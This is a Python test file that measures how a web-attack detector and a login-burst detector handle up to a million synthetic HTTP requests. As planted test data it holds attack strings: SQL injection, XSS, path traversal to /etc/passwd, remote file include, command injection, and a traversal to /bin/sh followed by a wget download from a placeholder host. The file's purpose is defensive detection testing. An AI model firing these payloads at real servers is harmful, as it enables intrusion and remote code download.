"""Actual streamed synthetic HTTP inspection, fold, roll-up and login-window measurements."""
from __future__ import annotations

import json
import time
from datetime import timedelta

import pytest

from romulus.detect.bounded import StateBudget
from romulus.detect.web_attacks import PAIR_LEADS, WebAttacks, WebLoginBurst
from romulus.evidence.typed import RawRef, fv
from tests.test_smb_impact_scale import _rss
from tests.test_web_attacks import event

_PLANTS = (
    "/item?id=1+union+select+1", "/?x=<script>alert(1)</script>", "/../../private/data",
    "/?include=http://files.example/payload.php", "/?x=host;whoami", "/?x={{7*7}}", "/ordinary",
)


def request(base, number, *, source=None, destination=None, uri="/ordinary", method="GET", status=200,
            agent="Mozilla/5.0"):
    fields = dict(base.fields)
    for key, value in (("source.ip", source), ("destination.ip", destination), ("url.original", uri),
                       ("http.request.method", method), ("http.response.status_code", status),
                       ("user_agent.original", agent)):
        if value is not None:
            fields[key] = fv(value, "native." + key)
    return base.model_copy(update={"id": f"request-{number}", "fields": fields,
                                   "ts": base.ts + timedelta(seconds=number),
                                   "raw": [RawRef(target="synthetic-scale-http", native_id=str(number))]})


def run_scale(tmp_path, rows):
    attack, login = WebAttacks(), WebLoginBurst()
    budget = StateBudget(tmp_path, disk_total=256 * 2**20, reserve=0, memory_total=2**20)
    attack.budget = login.budget = budget
    attack.spill_dir = login.spill_dir = tmp_path
    base = event()
    baseline_rss = peak_rss = _rss()
    began = time.perf_counter()
    batches = planted = live = 0
    sources = rows // 1000
    # A synthetic oracle of one scalar per planted login group; the detector
    # publishes threshold matches during consume and may have no final revision.
    observed_login = {}
    try:
        for start in range(0, rows, 256):
            batch = []
            for number in range(start, min(start + 256, rows)):
                group, offset = divmod(number, 1000)
                uri, method, status, agent = f"/products?tracking=id-{number}", "GET", 200, "Mozilla/5.0"
                if offset < 20:
                    uri, method, status = f"/login?user=account{offset % 4}", "POST", 401
                elif 25 <= offset <= 31:
                    uri = _PLANTS[offset - 25]
                    if offset == 31:
                        agent = "Nikto/2.5"
                    planted += 1
                batch.append(request(base, number, source=f"10.7.{group // 256}.{group % 256}", uri=uri,
                                     method=method, status=status, agent=agent))
            live += sum(1 for _ in attack.consume(batch))
            for match in login.consume(batch):
                assert match.proposed_lane == "lead"
                observed_login[match.group_key] = match.aggregate_summary["total_refs"]
            batches += 1
            if batches % 16 == 0:
                peak_rss = max(peak_rss, _rss())
        # Every source sends each of the seven classes once to one server: the first PAIR_LEADS sources keep a lead
        # of their own per class, and one roll-up per class stands for all of them once there are more.
        own = roll_ups = rolled_rows = 0
        for match in attack.finalize():
            assert match.proposed_lane == "lead" and len(match.events) <= 2
            assert match.aggregate_summary["count_complete"] == 1
            if match.group_key.startswith("fleet|"):
                roll_ups += 1
                rolled_rows += match.aggregate_summary["record_count"]
                assert match.aggregate_summary["member_count"] == match.fleet_host_count == sources
                assert sum(1 for _member in match.fleet_hosts) == sources
            else:
                own += 1
                assert match.aggregate_summary["record_count"] == 1
        for match in login.finalize():
            assert match.proposed_lane == "lead" and match.aggregate_summary["total_refs"] == 20
            observed_login[match.group_key] = match.aggregate_summary["total_refs"]
        login_groups = len(observed_login)
        login_rows = sum(observed_login.values())
        seconds = time.perf_counter() - began
        peak_rss = max(peak_rss, _rss())
        assert attack.evaluated == login.evaluated == rows
        assert attack.capped == login.capped == 0
        assert own == 7 * min(sources, PAIR_LEADS)
        assert roll_ups == (7 if sources > PAIR_LEADS else 0)
        assert rolled_rows == (planted if sources > PAIR_LEADS else 0) and planted == sources * 7
        assert live <= own + roll_ups
        assert login_groups == rows // 1000 and login_rows == rows // 1000 * 20
        return {"rows": rows, "seconds": seconds, "rows_per_second": rows / seconds,
                "baseline_rss_bytes": baseline_rss, "sampled_peak_rss_bytes": peak_rss,
                "sampled_rss_growth_bytes": peak_rss - baseline_rss,
                "attack_findings": own + roll_ups, "attack_records": planted,
                "login_groups": login_groups, "login_attempt_references": login_rows,
                "detector_disk_bytes": budget.physical_used, "caps": attack.capped + login.capped,
                "scope": "Actual typed detector consume/finalize; bounded 256-event batches; excludes normalization, backend and full hunt"}
    finally:
        attack.close_spill()
        login.close_spill()


def test_http_scale_calibration(tmp_path):
    result = run_scale(tmp_path, 10_000)
    print("WEB_ATTACKS_CALIBRATION " + json.dumps(result))


@pytest.mark.slow
def test_one_million_http_requests_with_planted_attacks(tmp_path, record_property):
    result = run_scale(tmp_path, 1_000_000)
    assert result["sampled_rss_growth_bytes"] < 192 * 2**20
    print("WEB_ATTACKS_SCALE " + json.dumps(result))
    record_property("web_attacks_scale", json.dumps(result))


def fold(tmp_path, rows):
    """Consume generated requests in bounded batches; the live matches, the final ones, and the measurements."""
    rule = WebAttacks()
    rule.budget = StateBudget(tmp_path, disk_total=256 * 2**20, reserve=0, memory_total=2**20)
    rule.spill_dir = tmp_path
    baseline = _rss()
    began = time.perf_counter()
    live, batch, records = [], [], 0
    for row in rows:
        batch.append(row)
        records += 1
        if len(batch) == 256:
            live.extend(rule.consume(batch))
            batch = []
    live.extend(rule.consume(batch))
    consumed = time.perf_counter() - began
    final = {match.group_key: match for match in rule.finalize()}
    measured = {"records": records, "consume_seconds": round(consumed, 2),
                "records_per_second": round(records / consumed), "live_matches": len(live),
                "final_findings": len(final), "rss_growth_bytes": _rss() - baseline,
                "detector_disk_bytes": rule.budget.physical_used, "caps": rule.capped}
    return rule, live, final, measured


def test_twenty_thousand_sources_against_one_server_are_one_fleet_per_class(tmp_path):
    base = event()
    # one request that is both a traversal and a command injection, from each of 20,000 outside addresses
    uri = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh;wget+http://192.0.2.9/x"
    rows = (request(base, s, source=f"198.{18 + s // 60000}.{(s // 250) % 240}.{s % 250 + 1}",
                    destination="10.9.0.1", uri=uri) for s in range(20_000))
    rule, live, final, measured = fold(tmp_path, rows)
    try:
        print("WEB_ATTACKS_FLEET " + json.dumps(measured))
        assert len(final) == 2 * (PAIR_LEADS + 1) and len(live) == 2 * (PAIR_LEADS + 1)
        assert all(match.proposed_lane == "lead" for match in [*live, *final.values()])
        for name in ("command_injection", "path_traversal_lfi"):
            fleet = final[f"fleet|10.9.0.1|{name}|out"]
            assert fleet.fleet_member_kind == "external_address"
            assert fleet.fleet_host_count == fleet.aggregate_summary["member_count"] == 20_000
            assert fleet.aggregate_summary["record_count"] == 20_000
            assert fleet.aggregate_summary["count_complete"] == 1 and fleet.fleet_hosts_complete
            members = {address for address, _event in fleet.fleet_hosts}
            assert len(members) == 20_000 and "198.18.79.250" in members
            assert len(fleet.events) <= 2 and len(fleet.entities) <= 11
        assert measured["caps"] == 0
        assert measured["rss_growth_bytes"] < 96 * 2**20
    finally:
        rule.close_spill()


def test_one_scanner_against_five_hundred_servers_is_one_sweep_per_class(tmp_path):
    base = event()
    uris = ("/../../etc/passwd", "/s?q=<script>alert(1)</script>", "/x?id=1'+or+'1'='1")
    rows = (request(base, 3 * d + k, source="198.51.100.7", destination=f"10.9.{d // 250}.{d % 250 + 1}", uri=uri)
            for d in range(500) for k, uri in enumerate(uris))
    rule, live, final, measured = fold(tmp_path, rows)
    try:
        print("WEB_ATTACKS_SWEEP " + json.dumps(measured))
        assert len(final) == 3 * (PAIR_LEADS + 1) and len(live) == 3 * (PAIR_LEADS + 1)
        for name in ("cross_site_scripting", "path_traversal_lfi", "sql_injection"):
            sweep = final[f"sweep|198.51.100.7|{name}|in"]
            assert sweep.proposed_lane == "lead" and sweep.fleet_member_kind == "internal_address"
            assert sweep.fleet_host_count == sweep.aggregate_summary["member_count"] == 500
            assert len({address for address, _event in sweep.fleet_hosts}) == 500
    finally:
        rule.close_spill()


def test_two_thousand_scanners_against_fifty_servers_follow_the_servers_not_the_scanners(tmp_path):
    base = event()
    rows = (request(base, 50 * s + d, source=f"198.51.{s // 250}.{s % 250 + 1}", destination=f"10.9.0.{d + 1}",
                    uri="/x?id=1'+or+'1'='1") for s in range(2000) for d in range(50))
    rule, live, final, measured = fold(tmp_path, rows)
    try:
        print("WEB_ATTACKS_GRID " + json.dumps(measured))
        fleets = [match for key, match in final.items() if key.startswith("fleet|")]
        assert len(fleets) == 50 and all(match.fleet_host_count == 2000 for match in fleets)
        assert sum(match.aggregate_summary["record_count"] for match in fleets) == 100_000
        # 100,000 pairs: at most PAIR_LEADS own leads and PAIR_LEADS sweeps per server, whatever the scanner count
        assert len(final) <= 50 * (2 * PAIR_LEADS + 1) and len(live) <= 50 * (2 * PAIR_LEADS + 1)
        # read in time order, what was published as records arrived is what stands at the end
        assert {match.group_key for match in live} == set(final)
        assert all(match.proposed_lane == "lead" for match in final.values())
    finally:
        rule.close_spill()


def test_dense_attack_throughput_is_reported(tmp_path):
    base = event()
    uri = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh;wget+http://192.0.2.9/x"
    rows = (request(base, n, uri=uri) for n in range(20_000))
    rule, _live, final, measured = fold(tmp_path, rows)
    try:
        print("WEB_ATTACKS_DENSE " + json.dumps(measured))
        assert len(final) == 2 and all(match.aggregate_summary["record_count"] == 20_000 for match in final.values())
    finally:
        rule.close_spill()
